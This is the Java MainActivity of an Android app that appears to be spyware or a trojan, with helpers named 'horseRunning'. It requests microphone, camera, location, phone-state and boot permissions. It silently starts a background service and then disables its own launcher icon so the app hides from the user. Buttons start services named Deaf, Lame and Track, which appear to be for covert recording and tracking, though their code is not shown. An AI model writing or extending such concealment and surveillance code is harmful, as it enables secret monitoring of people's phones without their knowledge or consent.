package com.cripple;

/**
 * Created by Developer on 23.01.2018.
 */

import android.Manifest;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import com.glob.Global;

import java.io.IOException;


public class MainActivity extends AppCompatActivity {

    int PERMISSIONS = 0;


    //----------------------------------------------------------------------------------------------
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermissions();
    }

    @Override
    protected void onStart() {
        Global.printLn("BlindActivity","onStart()","");
        super.onStart();
        runnerService();

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        finish();
    }


    //----------------------------------------------------------------------------------------------
    private boolean checkPermissions() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_BOOT_COMPLETED) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                                                                        Manifest.permission.RECORD_AUDIO,
                                                                        Manifest.permission.READ_PHONE_STATE,
                                                                        Manifest.permission.CAMERA,
                                                                        Manifest.permission.ACCESS_FINE_LOCATION,
                                                                        Manifest.permission.ACCESS_COARSE_LOCATION,
                                                                        Manifest.permission.RECEIVE_BOOT_COMPLETED},
                                                PERMISSIONS);
            return false;
        } else
            return true;
    }

    //----------------------------------------------------------------------------------------------
    private boolean horseRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }


    //----------------------------------------------------------------------------------------------
    private void runnerService(){
        if (horseRunning(Runner.class))
            return;
        Intent startTemp = new Intent(MainActivity.this, Runner.class);
        startService(startTemp);
    }

    //----------------------------------------------------------------------------------------------
    public void deafClick(View v) throws IOException {
        Global.printLn("MainActivity","deafClick","horseRunning =" + horseRunning(Deaf.class));
        if (checkPermissions() & !horseRunning(Deaf.class))
            startService(new Intent(this, Deaf.class));
    }

    //----------------------------------------------------------------------------------------------
    public void lameClick(View v){
        Global.printLn("MainActivity","lameClick","horseRunning =" + horseRunning(Lame.class));
        if (checkPermissions() & !horseRunning(Lame.class)){
            runnerService();
            Intent startLame = new Intent(MainActivity.this, Lame.class);
            startService(startLame);
        }
    }
    //----------------------------------------------------------------------------------------------
    public void trackClick(View v){
        Global.printLn("MainActivity","trackClick","horseRunning =" + horseRunning(Track.class));

        if (checkPermissions() & !horseRunning(Track.class)){
            runnerService();
            Intent startChase = new Intent(MainActivity.this, Track.class);
            startService(startChase);

        }
    }

    //----------------------------------------------------------------------------------------------
    public void runServ(View v) throws IOException {
        runnerService();
    }

    //----------------------------------------------------------------------------------------------
    public void stopServ(View v) throws IOException {
        stopService(new Intent(this, Deaf.class));
        stopService(new Intent(this, Lame.class));
        stopService(new Intent(this, Track.class));
        stopService(new Intent(this, Runner.class));
        stopService(new Intent(this, Temp.class));
    }




}
